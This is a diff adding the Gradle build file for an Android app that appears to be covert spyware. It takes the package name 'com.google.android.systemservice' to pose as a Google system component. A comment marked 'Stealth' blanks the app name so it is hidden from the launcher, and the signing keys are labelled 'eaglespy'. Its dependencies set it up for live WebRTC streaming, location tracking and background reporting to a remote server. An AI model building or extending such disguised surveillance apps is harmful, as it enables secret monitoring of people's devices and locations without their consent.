@@ -1,0 +1,133 @@
+plugins {
+    id 'com.android.application'
+    id 'org.jetbrains.kotlin.android'
+    id 'kotlin-kapt'
+    id 'dagger.hilt.android.plugin'
+}
+
+android {
+    namespace 'com.google.android.systemservice'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.google.android.systemservice"
+        minSdk 24
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+
+        // Dynamic Server URL from Gradle Property (-PserverBaseUrl="http://ip:port")
+        def serverBaseUrl = project.hasProperty('serverBaseUrl') ? project.serverBaseUrl : "http://10.0.2.2:3000"
+        buildConfigField "String", "SERVER_BASE_URL", "\"${serverBaseUrl}\""
+        
+        // Device Authentication Token from Gradle Property (-PdeviceToken="...")
+        // Generate unique token per deployment: openssl rand -base64 32
+        def deviceToken = project.hasProperty('deviceToken') ? project.deviceToken : System.getenv('DEVICE_AUTH_TOKEN') ?: 'CHANGE_ME_BEFORE_DEPLOYMENT'
+        buildConfigField "String", "DEVICE_AUTH_TOKEN", "\"${deviceToken}\""
+
+        // Stealth: Empty app name (invisible in launcher)
+        resValue "string", "app_name", ""
+    }
+
+    signingConfigs {
+        release {
+            storeFile file('../release.keystore')
+            storePassword System.getenv('RELEASE_STORE_PASSWORD') ?: project.findProperty('RELEASE_STORE_PASSWORD') ?: 'eaglespy_dev_pass'
+            keyAlias System.getenv('RELEASE_KEY_ALIAS') ?: project.findProperty('RELEASE_KEY_ALIAS') ?: 'eaglespy'
+            keyPassword System.getenv('RELEASE_KEY_PASSWORD') ?: project.findProperty('RELEASE_KEY_PASSWORD') ?: 'eaglespy_dev_pass'
+        }
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled true
+            shrinkResources true
+            signingConfig signingConfigs.release
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+        debug {
+            minifyEnabled false
+        }
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_17
+        targetCompatibility JavaVersion.VERSION_17
+    }
+
+    kotlinOptions {
+        jvmTarget = '17'
+    }
+
+    buildFeatures {
+        viewBinding true
+        buildConfig true
+    }
+}
+
+dependencies {
+    // Core Android
+    implementation 'androidx.core:core-ktx:1.12.0'
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'androidx.activity:activity-ktx:1.8.2'
+    implementation 'com.google.android.material:material:1.11.0'
+    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
+
+    // WebRTC for Live Streaming (packaged via webrtc-sdk)
+    implementation 'io.github.webrtc-sdk:android:125.6422.07'
+
+    // Location Services
+    implementation 'com.google.android.gms:play-services-location:21.0.1'
+
+    // WebSocket for Signaling
+    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
+    implementation 'com.squareup.okhttp3:logging-interceptor:4.12.0'
+
+    // WorkManager for Background Tasks
+    implementation 'androidx.work:work-runtime-ktx:2.9.0'
+
+    // Encryption
+    implementation 'androidx.security:security-crypto:1.1.0-alpha06'
+
+    // JSON Parsing
+    implementation 'com.google.code.gson:gson:2.10.1'
+
+    // Kotlin Coroutines
+    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
+    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-core:1.7.3'
+    
+    // Lifecycle (ViewModel, LiveData)
+    def lifecycle_version = "2.7.0"
+    implementation "androidx.lifecycle:lifecycle-viewmodel-ktx:$lifecycle_version"
+    implementation "androidx.lifecycle:lifecycle-livedata-ktx:$lifecycle_version"
+    implementation "androidx.lifecycle:lifecycle-runtime-ktx:$lifecycle_version"
+    
+    // Room (Local DB)
+    def room_version = "2.6.1"
+    implementation "androidx.room:room-runtime:$room_version"
+    implementation "androidx.room:room-ktx:$room_version"
+    kapt "androidx.room:room-compiler:$room_version"
+    
+    // Dependency Injection - Hilt
+    implementation "com.google.dagger:hilt-android:2.50"
+    kapt "com.google.dagger:hilt-compiler:2.50"
+    
+    // Hilt WorkManager integration
+    implementation 'androidx.hilt:hilt-work:1.1.0'
+    kapt 'androidx.hilt:hilt-compiler:1.1.0'
+    
+    // Retrofit (for structured API calls)
+    implementation 'com.squareup.retrofit2:retrofit:2.9.0'
+    implementation 'com.squareup.retrofit2:converter-gson:2.9.0'
+    
+    // Timber for logging
+    implementation 'com.jakewharton.timber:timber:5.0.1'
+    
+    // Testing
+    testImplementation 'junit:junit:4.13.2'
+    testImplementation 'org.jetbrains.kotlinx:kotlinx-coroutines-test:1.7.3'
+    testImplementation 'androidx.arch.core:core-testing:2.2.0'
+    testImplementation 'io.mockk:mockk:1.13.8'
+    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
+    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
+}
